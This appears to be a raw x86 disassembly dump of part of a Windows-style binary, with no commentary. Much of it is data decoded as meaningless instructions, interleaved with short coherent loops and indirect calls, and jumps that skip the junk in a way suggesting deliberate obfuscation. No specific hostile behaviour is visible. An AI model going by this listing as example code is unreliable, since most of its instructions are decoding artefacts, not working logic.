  4020d8:	sub    BYTE PTR [eax-0xdd1b18e],dh
  4020de:	into   
  4020df:	and    eax,0x635fc306
  4020e4:	iret   
  4020e5:	test   DWORD PTR [eax+0x5211d8c],ebp
  4020eb:	sbb    ebx,edi
  4020ed:	mov    edi,0x8f326f96
  4020f2:	xchg   edi,eax
  4020f3:	(bad)  
  4020f4:	out    dx,al
  4020f5:	jbe    0x40212a
  4020f7:	dec    ebp
  4020f8:	pop    eax
  4020f9:	xlat   BYTE PTR ds:[ebx]
  4020fa:	and    DWORD PTR [edi+eax*4],eax
  4020fd:	lar    ebx,WORD PTR [edx+0x1c]
  402101:	clc    
  402102:	xchg   esp,eax
  402103:	rcl    al,0xee
  402106:	stos   DWORD PTR es:[edi],eax
  402107:	(bad)  
  402108:	retf   0x2ae6
  40210b:	ja     0x402163
  40210d:	js     0x4020c0
  40210f:	inc    edi
  402110:	push   esi
  402111:	xor    cl,al
  402113:	sahf   
  402114:	lahf   
  402115:	fstp   DWORD PTR [esi+0x6a9a368c]
  40211b:	retf   0xff5f
  40211e:	out    dx,al
  40211f:	je     0x4020ec
  402121:	fstp   st(6)
  402123:	pop    ecx
  402124:	addr16 mov ebx,0x8fca7cc6
  40212a:	enter  0x1316,0x26
  40212e:	push   edx
  40212f:	stc    
  402130:	enter  0xd5d5,0x25
  402134:	aad    0x7f
  402136:	adc    esi,DWORD PTR [ebx+0x18]
  402139:	ficom  DWORD PTR ds:0x866e2581
  40213f:	pop    ebp
  402140:	dec    esp
  402141:	dec    ecx
  402142:	cmp    bl,BYTE PTR [ecx-0x50b5e2e3]
  402148:	pop    ds
  402149:	and    DWORD PTR [ecx-0x55],0x70213672
  402150:	inc    ebp
  402151:	xor    dh,BYTE PTR [eax-0x1efc85ed]
  402157:	push   esp
  402158:	(bad)  
  402159:	rcl    cl,cl
  40215b:	cli    
  40215c:	add    esp,esp
  40215e:	adc    bh,BYTE PTR [ecx]
  402160:	pop    ecx
  402161:	adc    BYTE PTR [edx],bh
  402163:	aas    
  402164:	dec    ebx
  402165:	mov    ch,0x2d
  402167:	add    al,0x38
  402169:	pusha  
  40216a:	sbb    eax,0x7b77fa6
  40216f:	sub    ah,BYTE PTR [edi-0x2b]
  402172:	xchg   ecx,eax
  402173:	ror    DWORD PTR [eax],1
  402175:	cmc    
  402176:	mov    cs,WORD PTR [esi-0x7b]
  402179:	scas   al,BYTE PTR es:[edi]
  40217a:	fwait
  40217b:	gs mov al,0x27
  40217e:	sbb    cl,BYTE PTR [eax]
  402180:	mov    ebp,0xe49c3f33
  402185:	xchg   BYTE PTR [ebp+ebx*8+0x4628df49],al
  40218c:	dec    ebx
  40218d:	adc    DWORD PTR [eax+0x7],edx
  402190:	imul   ecx
  402192:	mov    ebp,0x53e16b43
  402197:	std    
  402198:	daa    
  402199:	jecxz  0x40215f
  40219b:	sub    ecx,DWORD PTR [edx+eax*4]
  40219e:	xor    eax,0x98fdd2c5
  4021a3:	gs jo  0x402174
  4021a6:	adc    ch,bl
  4021a8:	cli    
  4021a9:	mov    ecx,0x9abe79d4
  4021ae:	sub    dh,BYTE PTR [eax-0x1f195009]
  4021b4:	out    dx,al
  4021b5:	cmp    edx,edi
  4021b7:	inc    esi
  4021b8:	jp     0x402239
  4021ba:	push   0xffffffaf
  4021bc:	lds    edi,FWORD PTR [edi+0x28]
  4021bf:	jmp    0x40215d
  4021c1:	(bad)  
  4021c2:	sti    
  4021c3:	sub    DWORD PTR [esi],ebp
  4021c5:	mov    WORD PTR [ecx-0x77],es
  4021c8:	xchg   esi,eax
  4021c9:	scas   eax,DWORD PTR es:[edi]
  4021ca:	fisubr WORD PTR [eax-0x6d338f6c]
  4021d0:	sbb    ebp,edi
  4021d2:	in     eax,0x66
  4021d4:	(bad)  
  4021d6:	(bad)  
  4021d7:	jle    0x402167
  4021d9:	sbb    ebx,esi
  4021db:	lods   eax,DWORD PTR ds:[esi]
  4021dc:	dec    esp
  4021dd:	xchg   bl,bh
  4021df:	in     al,0x41
  4021e1:	add    DWORD PTR [ebx-0x3a900538],0x59091ed
  4021eb:	stos   DWORD PTR es:[edi],eax
  4021ec:	sbb    edi,DWORD PTR [ecx+edx*2]
  4021ef:	and    DWORD PTR [esi+0x390c0e14],ecx
  4021f5:	xchg   BYTE PTR [ecx+0x35],ch
  4021f8:	sub    dl,dh
  4021fa:	fs cmc 
  4021fc:	dec    edi
  4021fd:	inc    DWORD PTR [edx-0x4959b355]
  402203:	pop    es
  402204:	loop   0x402186
  402206:	inc    esp
  402207:	and    eax,0x10be8355
  40220c:	outs   dx,BYTE PTR ds:[esi]
  40220d:	in     al,0x62
  40220f:	jns    0x402267
  402211:	push   ebx
  402212:	mov    DWORD PTR [ecx-0x36409aff],esi
  402218:	lds    esi,FWORD PTR [edi+0x7fd86841]
  40221e:	mov    esi,0xbdc8201f
  402223:	iret   
  402224:	(bad)  
  402225:	call   0x9af6:0x5d9b694c
  40222c:	retf   
  40222d:	or     al,0x42
  40222f:	pop    edi
  402230:	xchg   ecx,eax
  402231:	and    cl,BYTE PTR [edx+0x31]
  402234:	ins    BYTE PTR es:[edi],dx
  402235:	add    ebx,DWORD PTR [esp+edx*4-0x39]
  402239:	fld    QWORD PTR [ecx+eiz*8-0x41]
  40223d:	fadd   DWORD PTR [esi+0x76]
  402240:	loopne 0x402240
  402242:	add    eax,0x8bb9700e
  402247:	jmp    0x735efff2
  40224c:	dec    eax
  40224d:	popf   
  40224e:	xor    esi,0xffffff94
  402251:	push   0x3d
  402253:	ror    ch,0x3b
  402256:	mov    ebx,0xc94e87f3
  40225b:	push   ecx
  40225c:	pop    esi
  40225d:	jmp    0x6fae:0xfb8aacd2
  402264:	fst    DWORD PTR [ebp-0x64eb97b9]
  40226a:	int3   
  40226b:	mov    dl,0x78
  40226d:	stos   BYTE PTR es:[edi],al
  40226e:	(bad)  
  40226f:	nop
  402270:	cmp    DWORD PTR [eax-0x6c839929],esp
  402276:	(bad)  
  402277:	mov    al,ds:0x6e99ae4a
  40227c:	popa   
  40227d:	mov    dh,0x69
  40227f:	test   al,0xba
  402281:	mov    al,0x3
  402283:	inc    ebx
  402284:	cwde   
  402285:	popaw  
  402287:	scas   eax,DWORD PTR es:[edi]
  402288:	sbb    ebp,esi
  40228a:	add    al,0xa1
  40228c:	pop    eax
  40228d:	push   esi
  40228e:	(bad)  
  40228f:	out    0xed,eax
  402291:	iret   
  402292:	mov    esi,0x466f906e
  402297:	lea    esi,[ebx]
  402299:	mov    ds:0x52315e36,eax
  40229e:	add    DWORD PTR [ebx],ebp
  4022a0:	lahf   
  4022a1:	test   al,0x1f
  4022a3:	pop    esp
  4022a4:	add    al,BYTE PTR [edx+0x5a1b87d9]
  4022aa:	xor    eax,DWORD PTR [esi+edx*2]
  4022ad:	jo     0x402253
  4022af:	xchg   ebp,eax
  4022b0:	idiv   DWORD PTR [eax-0x23]
  4022b3:	int3   
  4022b4:	mov    ebp,0x11e065c6
  4022b9:	mov    ch,0xc
  4022bb:	pop    ss
  4022bc:	test   ebx,0xf3294dd7
  4022c2:	mov    esp,DWORD PTR [edx-0x138907cb]
  4022c8:	cmp    cl,bl
  4022ca:	into   
  4022cb:	addr16 retf 0xcd37
  4022cf:	enter  0x3abe,0xfd
  4022d3:	les    esi,FWORD PTR [edx-0x728a2f1e]
  4022d9:	loop   0x4022f5
  4022db:	pop    ebx
  4022dc:	adc    DWORD PTR [eax+0x5ab0bd21],ebp
  4022e2:	outs   dx,DWORD PTR ds:[esi]
  4022e3:	dec    ecx
  4022e4:	loop   0x402292
  4022e6:	xacquire xchg BYTE PTR [edx+0x1d],dh
  4022ea:	mov    al,0x77
  4022ec:	or     eax,0xfbc54123
  4022f1:	dec    edx
  4022f2:	int3   
  4022f3:	push   edi
  4022f4:	out    dx,al
  4022f5:	lahf   
  4022f6:	cmp    ebx,ecx
  4022f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4022f9:	push   eax
  4022fa:	stos   BYTE PTR es:[edi],al
  4022fb:	neg    edi
  4022fd:	and    BYTE PTR [edi-0x215186ca],dl
  402303:	fxtract 
  402305:	ret    0xf846
  402308:	and    eax,0xc46dae23
  40230d:	mov    BYTE PTR [ecx+0x69d949e5],bl
  402313:	retf   
  402314:	jns    0x40230b
  402316:	shl    BYTE PTR [esi+0x173d3ff],cl
  40231c:	mov    ch,0x3f
  40231e:	nop
  40231f:	dec    ebx
  402320:	inc    ebx
  402321:	mov    ah,BYTE PTR [esi]
  402323:	aaa    
  402324:	sub    cl,0x23
  402327:	lds    esi,FWORD PTR [edi+0x6ceb8adf]
  40232d:	je     0x402352
  40232f:	psraw  mm2,QWORD PTR [ebp+0x2dce4e6d]
  402336:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402337:	adc    ebp,DWORD PTR ds:0x8d2d0450
  40233d:	mov    edi,0xff5a0db6
  402342:	cmp    dh,BYTE PTR [esi]
  402344:	mov    edi,0xd6107ec9
  402349:	pop    esp
  40234a:	xor    al,0xc
  40234c:	jne    0x4022fa
  40234e:	js     0x402330
  402350:	out    0x59,al
  402352:	sar    BYTE PTR [esi],0x7
  402355:	inc    edx
  402356:	xchg   ecx,eax
  402357:	push   0x68858dcc
  40235c:	(bad)  
  40235d:	(bad)  
  40235e:	inc    DWORD PTR [ebx-0x77]
  402361:	inc    ebp
  402362:	clc    
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433617,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4336fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43367b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43367b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43367b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43367b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43367b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4336bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4336f7
  4023d7:	or     DWORD PTR ds:0x433667,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433677,0x43373f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43366f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43366f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43366f,ecx
  40240a:	cmp    DWORD PTR ds:0x43366f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433810
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43366f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43366f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43366f,ecx
  402450:	cmp    DWORD PTR ds:0x43366f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx-0x709d5390]
  402480:	fdiv   QWORD PTR [eax+0x7e7e01ba]
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x402436
  40248b:	and    dl,BYTE PTR [ebx-0x78]
  40248e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40248f:	das    
  402490:	aad    0x1b
  402492:	outs   dx,DWORD PTR ds:[esi]
  402493:	dec    eax
  402494:	lods   al,BYTE PTR ds:[esi]
  402495:	scas   al,BYTE PTR es:[edi]
  402496:	cmp    DWORD PTR [ecx],ecx
  402498:	mov    al,0xf6
  40249a:	clc    
  40249b:	sub    DWORD PTR [edx],ebp
  40249d:	rol    edi,0x70
  4024a0:	mov    ecx,0xd798cd8c
  4024a5:	jg     0x402494
  4024a7:	and    esp,DWORD PTR [esi+0x55]
  4024aa:	xchg   edi,eax
  4024ab:	pop    esp
  4024ac:	lock dec esp
  4024ae:	out    0x8c,al
  4024b0:	sub    DWORD PTR [ebx+0x231a17fc],0x905268f4
  4024ba:	pop    ebx
  4024bb:	add    eax,0x63bdf095
  4024c0:	and    DWORD PTR [ecx+0x17],ebx
  4024c3:	pop    esi
  4024c4:	push   ds
  4024c5:	dec    ecx
  4024c6:	fist   WORD PTR [ebx-0x757207d0]
  4024cc:	or     eax,0x49310e2c
  4024d1:	imul   ebp,DWORD PTR [eax+ecx*8+0x360e1616],0x15166fc2
  4024dc:	in     eax,0x63
  4024de:	xor    bh,BYTE PTR [ebx-0x3d]
  4024e1:	pushf  
  4024e2:	and    ch,BYTE PTR [edi]
  4024e4:	add    ah,BYTE PTR [edx]
  4024e6:	sbb    DWORD PTR [edi-0x46],esp
  4024e9:	(bad)
  4024ec:	into   
  4024ed:	lods   eax,DWORD PTR ds:[esi]
  4024ee:	sahf   
  4024ef:	(bad)  
  4024f0:	and    ebx,edi
  4024f2:	ins    DWORD PTR es:[edi],dx
  4024f3:	xor    DWORD PTR [ecx+edx*4-0x76],ebx
  4024f7:	inc    esp
  4024f8:	mov    dl,0xa7
  4024fa:	test   DWORD PTR [ecx-0x237a3ef],ebp
  402500:	and    al,cl
  402502:	push   es
  402503:	addr16 std 
  402505:	das    
  402506:	pop    ecx
  402507:	xor    al,0x5f
  402509:	xor    eax,0x74d4007f
  40250e:	adc    BYTE PTR [eax-0x4c],dl
  402511:	dec    edx
  402512:	inc    ecx
  402513:	pop    ss
  402514:	xor    BYTE PTR [edi],al
  402516:	daa    
  402517:	retf   
  402518:	in     al,0xa2
  40251a:	dec    ebp
  40251b:	xor    ch,BYTE PTR [edi-0x4433ed4]
  402521:	ja     0x402564
  402523:	outs   dx,DWORD PTR ds:[esi]
  402524:	mov    ds:0xde282670,eax
  402529:	and    BYTE PTR [ebp+0x12],0x65
  40252d:	push   edi
  40252e:	adc    eax,0x3d72ca08
  402533:	adc    BYTE PTR [eax+0x26d95f1e],dl
  402539:	nop
  40253a:	jae    0x402528
  40253c:	mov    ds:0x9e5b31d7,al
  402541:	imul   ebp,DWORD PTR [ecx],0x2b772a8
  402547:	int3   
  402548:	scas   al,BYTE PTR es:[edi]
  402549:	mov    BYTE PTR [esi-0x20],al
  40254c:	stc    
  40254d:	lods   eax,DWORD PTR ds:[esi]
  40254e:	bnd jg 0x4024f9
  402551:	into   
  402552:	in     al,0x37
  402554:	xchg   ebp,eax
  402555:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402556:	mov    ebx,0xfe97876
  40255b:	loop   0x4025a2
  40255d:	adc    al,0x81
  40255f:	inc    ecx
  402560:	mov    cl,0x7c
  402562:	int    0x95
  402564:	sub    ebp,DWORD PTR [ebx+0x450a859a]
  40256a:	lds    esp,FWORD PTR [edx]
  40256c:	cmc    
  40256d:	mov    bl,BYTE PTR [edx-0x1a65151c]
  402573:	push   edx
  402574:	mov    ch,BYTE PTR [ebx+0x12]
  402577:	mov    BYTE PTR [esi-0x47ed6a0b],ah
  40257d:	pop    ebx
  40257e:	mov    ebp,0x8711815f
  402583:	mov    al,ds:0x292083a9
  402588:	scas   al,BYTE PTR es:[edi]
  402589:	xor    BYTE PTR [eax-0x3e],bl
  40258c:	lock mov DWORD PTR ds:0xb15e0bd,ecx
  402593:	pushf  
  402594:	mov    ds:0x784ecb5c,eax
  402599:	jp     0x40254b
  40259b:	scas   eax,DWORD PTR es:[edi]
  40259c:	(bad)  
  40259d:	sbb    al,0xb3
  40259f:	pop    ds
  4025a0:	push   0xffffffd0
  4025a2:	adc    al,BYTE PTR [esi]
  4025a4:	push   es
  4025a5:	aam    0xc3
  4025a7:	mov    edx,0xde242968
  4025ac:	and    dl,BYTE PTR [edx-0x310c4ed4]
  4025b2:	repnz add bl,cl
  4025b5:	call   0xe993a956
  4025ba:	jg     0x4025c7
  4025bc:	mov    eax,ds:0x3e072e3e
  4025c1:	dec    eax
  4025c2:	iret   
  4025c3:	lods   eax,DWORD PTR ds:[esi]
  4025c4:	adc    ebx,edx
  4025c6:	imul   esi,DWORD PTR [edx+0x6a],0xffffffc8
  4025ca:	stos   DWORD PTR es:[edi],eax
  4025cb:	sub    DWORD PTR [edx+eax*1+0x9e752ee],eax
  4025d2:	sbb    edi,DWORD PTR [eax+0x5136a68e]
  4025d8:	push   0x53c6f1a5
  4025dd:	xchg   edx,eax
  4025de:	add    edi,DWORD PTR [esi]
  4025e0:	adc    DWORD PTR [esi],esi
  4025e2:	retf   
  4025e3:	popf   
  4025e4:	mov    cl,BYTE PTR [ecx+ecx*2+0x72]
  4025e8:	push   ebp
  4025e9:	out    0x2c,eax
  4025eb:	cmp    eax,0xd77822c2
  4025f0:	cwde   
  4025f1:	fcom   DWORD PTR [esi-0x63]
  4025f4:	or     BYTE PTR [edi+0x4c],cl
  4025f7:	pop    esi
  4025f8:	std    
  4025f9:	sbb    BYTE PTR [edx+0x5d],cl
  4025fc:	out    0x52,eax
  4025fe:	imul   eax,edi,0x4a
  402601:	mov    ecx,0x489d6e89
  402606:	mov    al,0x70
  402608:	in     al,0x1b
  40260a:	aam    0x72
  40260c:	int3   
  40260d:	jge    0x4025ee
  40260f:	outs   dx,DWORD PTR ds:[esi]
  402610:	adc    edi,DWORD PTR [ecx+0x7d]
  402613:	jmp    0x670b:0x28858bcb
  40261a:	mov    ecx,0x80d597cc
  40261f:	jbe    0x4025b0
  402621:	pop    ecx
  402622:	into   
  402623:	aaa    
  402624:	xor    esi,DWORD PTR [ebx]
  402626:	ss sub ch,ah
  402629:	stos   DWORD PTR es:[edi],eax
  40262a:	ins    DWORD PTR es:[edi],dx
  40262b:	mov    eax,0x966c5160
  402630:	sbb    al,0x24
  402633:	data16 xor al,0xff
  402636:	ins    DWORD PTR es:[edi],dx
  402637:	dec    esp
  402638:	pop    edi
  402639:	sub    dl,BYTE PTR [edx-0x29]
  40263c:	lods   eax,DWORD PTR ds:[esi]
  40263d:	jmp    0x402673
  40263f:	mov    ebx,0x19e5e57a
  402644:	mov    eax,ds:0xefca89a7
  402649:	sbb    DWORD PTR ss:[ecx],esp
  40264c:	in     eax,0x19
  40264e:	push   es
  40264f:	lods   al,BYTE PTR ds:[esi]
  402650:	jb     0x4026b0
  402652:	jo     0x40263a
  402654:	or     eax,DWORD PTR [ecx]
  402656:	aas    
  402657:	jo     0x402606
  402659:	pop    ds
  40265a:	mov    al,0x99
  40265c:	(bad)  
  40265d:	sbb    BYTE PTR [edx-0x784975ef],al
  402663:	(bad)  
  402664:	faddp  st(0),st
  402666:	(bad)  
  402667:	push   edx
  402668:	pop    esi
  402669:	mov    ds:0x139766b1,al
  40266e:	push   edx
  40266f:	jge    0x402670
  402671:	mov    BYTE PTR [ecx+eiz*4+0x7cf90444],bh
  402678:	retf   0x8234
  40267b:	mov    ecx,0x512163bd
  402680:	sub    dh,BYTE PTR [edi-0x1b]
  402683:	mov    bl,0x83
  402685:	jecxz  0x4026d4
  402687:	out    dx,eax
  402688:	aas    
  402689:	mov    bh,0xa5
  40268b:	popf   
  40268c:	mov    dl,0xa3
  40268e:	push   ds
  40268f:	mov    eax,ds:0x4a28aaa
  402694:	arpl   WORD PTR [ebp-0xe1ebe26],di
  40269a:	jo     0x402705
  40269c:	mov    edx,0x9b19dfc0
  4026a1:	mov    al,ds:0xfb393a67
  4026a6:	xlat   BYTE PTR ds:[ebx]
  4026a7:	jns    0x4026f4
  4026a9:	dec    eax
  4026aa:	stos   BYTE PTR es:[edi],al
  4026ab:	mov    ecx,0x9a417c8d
  4026b0:	test   al,0x2
  4026b2:	xor    bl,BYTE PTR [ecx+0x4eb99242]
  4026b8:	adc    cl,BYTE PTR [ebx]
  4026ba:	retf   
  4026bb:	xchg   BYTE PTR [ebx-0x3cb58c2e],dh
  4026c1:	popf   
  4026c2:	imul   esi,DWORD PTR [ebp-0x66669735],0x342eb32e
  4026cc:	ins    BYTE PTR es:[edi],dx
  4026cd:	sbb    ah,BYTE PTR [esi+0x19]
  4026d0:	and    edi,DWORD PTR [ecx+0x6c1c59f2]
  4026d6:	call   0x33b341cb
  4026db:	pop    ss
  4026dc:	and    al,0xa2
  4026de:	inc    ebx
  4026df:	dec    ecx
  4026e0:	adc    al,0xed
  4026e2:	xor    DWORD PTR [ebp+0xa305768],0x53
  4026e9:	xor    BYTE PTR [ebx+0x7c],bh
  4026ec:	shl    bh,0x71
  4026ef:	inc    edx
  4026f0:	neg    DWORD PTR [ebp+0x33]
  4026f3:	sub    esi,DWORD PTR ds:0x681a11d0
  4026f9:	mov    bl,0x3d
  4026fb:	xor    bl,BYTE PTR [ecx+0x5d]
  4026fe:	(bad)  
  4026ff:	loopne 0x4026e2
  402701:	jle    0x4026a9
  402703:	ss (bad) 
  402706:	pop    ss
  402707:	repnz lahf 
  402709:	imul   esi,eax,0xffffffb2
  40270c:	sbb    BYTE PTR [edx+0x2a],al
  40270f:	sub    eax,0x4af5782a
  402714:	push   edx
  402715:	cwde   
  402716:	mov    ah,0x74
  402718:	pop    es
  402719:	test   eax,0xa500b2a8
  40271e:	xchg   DWORD PTR [ecx-0x582bc471],edx
  402724:	jne    0x402709
  402726:	aad    0xbe
  402728:	pop    edx
  402729:	popf   
  40272a:	push   edi
  40272b:	inc    esp
  40272c:	sub    eax,0x12b4ee32
  402731:	cs push es
  402733:	cwde   
  402734:	mov    dl,0x26
  402736:	push   esp
  402737:	adc    eax,0xe23e7139
  40273c:	ss sub al,0x48
  40273f:	jmp    0xf5cb3b56
  402744:	outs   dx,DWORD PTR ds:[esi]
  402745:	fiadd  WORD PTR [edx-0x65]
  402748:	cmp    esi,esp
  40274a:	sbb    esp,ecx
  40274c:	in     eax,dx
  40274d:	jmp    0xe354d98
  402752:	jae    0x402771
  402754:	jg     0x4027ac
  402756:	nop
  402757:	inc    edx
  402758:	mov    ch,0x48
  40275a:	xor    BYTE PTR [ebp-0xbce9b09],0xd6
  402761:	add    al,0x71
  402763:	jns    0x4027a2
  402765:	ret    
  402766:	xchg   BYTE PTR [esi+0x41f2070b],cl
  40276c:	repnz std 
  40276e:	ds out dx,al
  402770:	mov    edi,ebp
  402772:	pop    eax
  402773:	pop    esp
  402774:	lahf   
  402775:	push   edi
  402776:	mov    BYTE PTR [ebx-0x2d5b6bb5],dl
  40277c:	mov    bl,0x4
  40277e:	mov    ds:0x1adb7c16,eax
  402783:	jecxz  0x4027a8
  402785:	sti    
  402786:	jbe    0x4027ec
  402788:	dec    ecx
  402789:	mov    ch,0xc4
  40278b:	mov    dh,0x6e
  40278d:	fmul   QWORD PTR [edi]
  40278f:	js     0x40276f
  402791:	cmp    dh,BYTE PTR ds:0x8b3fac1e
  402797:	mov    al,ds:0x4160780e
  40279c:	pop    es
  40279d:	mov    ah,0x7e
  40279f:	push   ecx
  4027a0:	pop    ecx
  4027a1:	xlat   BYTE PTR ds:[ebx]
  4027a2:	hlt    
  4027a3:	loopne 0x402737
  4027a5:	pop    es
  4027a6:	and    al,0x3a
  4027a8:	mov    dh,0x68
  4027aa:	ins    BYTE PTR es:[edi],dx
  4027ab:	(bad)  
  4027ac:	out    dx,eax
  4027ad:	or     eax,0x4e861bf8
  4027b2:	out    0xf9,al
  4027b4:	ins    DWORD PTR es:[edi],dx
  4027b5:	pop    edx
  4027b6:	and    eax,DWORD PTR [esi-0x3]
  4027b9:	add    BYTE PTR [eax+0x68],bl
  4027bc:	call   0x9f01d4cc
  4027c1:	(bad)  
  4027c2:	pop    ecx
  4027c3:	ficom  WORD PTR [edx]
  4027c5:	inc    ebx
  4027c6:	fnstenv [esi+0x64]
  4027c9:	pop    eax
  4027ca:	stos   DWORD PTR es:[edi],eax
  4027cb:	xor    ebx,ebp
  4027cd:	cmp    BYTE PTR [esp+esi*2],0x9d
  4027d1:	push   ecx
  4027d2:	scas   eax,DWORD PTR es:[edi]
  4027d3:	pop    ecx
  4027d4:	aas    
  4027d5:	jnp    0x40284a
  4027d7:	and    ch,BYTE PTR [ebp+eiz*8-0x58]
  4027db:	jp     0x4027b4
  4027dd:	pop    esi
  4027de:	fnstcw WORD PTR [ebx-0x27]
  4027e1:	jo     0x4027d9
  4027e3:	push   ebp
  4027e4:	dec    ecx
  4027e5:	add    DWORD PTR [esi],eax
  4027e7:	mov    eax,ds:0xa4ceb484
  4027ec:	push   0xd446f187
  4027f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027f2:	and    al,0x4d
  4027f4:	popa   
  4027f5:	scas   al,BYTE PTR es:[edi]
  4027f6:	add    DWORD PTR [ebx-0x7ca82f02],edx
  4027fc:	call   edi
  4027fe:	dec    edx
  4027ff:	jbe    0x4027be
  402801:	or     DWORD PTR [edx+0x78],ebp
  402804:	enter  0x1733,0xe4
  402808:	fwait
  402809:	dec    edi
  40280a:	inc    edi
  40280b:	push   0x29b4e670
  402810:	dec    eax
  402811:	scas   eax,DWORD PTR es:[edi]
  402812:	rcr    BYTE PTR [ebx+0x30d96c96],cl
  402818:	xor    al,BYTE PTR [edi+eax*2+0x5aaee453]
  40281f:	mov    edx,0xd63156c
  402824:	cmp    eax,DWORD PTR [ebx]
  402826:	push   eax
  402827:	xchg   ebp,eax
  402828:	mov    ds:0x9b970a37,al
  40282d:	xor    al,BYTE PTR [edi]
  40282f:	and    al,0x16
  402831:	hlt    
  402832:	push   esi
  402833:	jmp    0x402887
  402835:	mov    cl,0x89
  402837:	add    cl,BYTE PTR [eax+0x6f9ff8f0]
  40283d:	pop    edi
  40283e:	or     BYTE PTR [ecx+eiz*4+0x6db50041],0x5b
  402846:	xchg   ebx,eax
  402847:	retf   
  402848:	shl    BYTE PTR [ebp+0x21],cl
  40284b:	dec    eax
  40284c:	mov    DWORD PTR [ecx-0x3812e2ef],edi
  402852:	fwait
  402853:	sub    ch,BYTE PTR [edx-0x48]
  402856:	(bad)  
  402857:	fstp   DWORD PTR [ebx-0x16]
  40285a:	stc    
  40285b:	scas   al,BYTE PTR es:[edi]
  40285c:	cmp    al,0x8c
  40285e:	add    BYTE PTR [ebx+0x410a274f],dl
  402864:	pop    edi
  402865:	arpl   cx,sp
  402867:	pushf  
  402868:	enter  0xf920,0xab
  40286c:	inc    edi
  40286d:	and    ah,BYTE PTR [ecx+0x1429b522]
  402873:	js     0x40287e
  402875:	mov    dl,BYTE PTR [edi+0x1075a1f0]
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0x12922a31]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028cf:	in     al,0xa0
  4028d1:	repnz lods al,BYTE PTR ds:[esi]
  4028d3:	jecxz  0x40285b
  4028d5:	loop   0x40292d
  4028d7:	ds push esi
  4028d9:	ror    BYTE PTR [edi+0x66],cl
  4028dc:	adc    BYTE PTR [eax+0x5e],ah
  4028df:	test   al,0x3a
  4028e1:	test   al,0x39
  4028e3:	sub    cl,BYTE PTR [esi-0x3c4c26ab]
  4028e9:	sub    al,0xac
  4028eb:	push   esp
  4028ec:	ins    BYTE PTR es:[edi],dx
  4028ed:	jo     0x4028d0
  4028ef:	cld    
  4028f0:	pop    ebx
  4028f1:	lock inc esi
  4028f3:	mov    esi,0x6f9e1b49
  4028f8:	lds    esp,FWORD PTR [eax-0x5d14a102]
  4028fe:	imul   esp,DWORD PTR [edi],0x8ed5140b
  402904:	pop    ebx
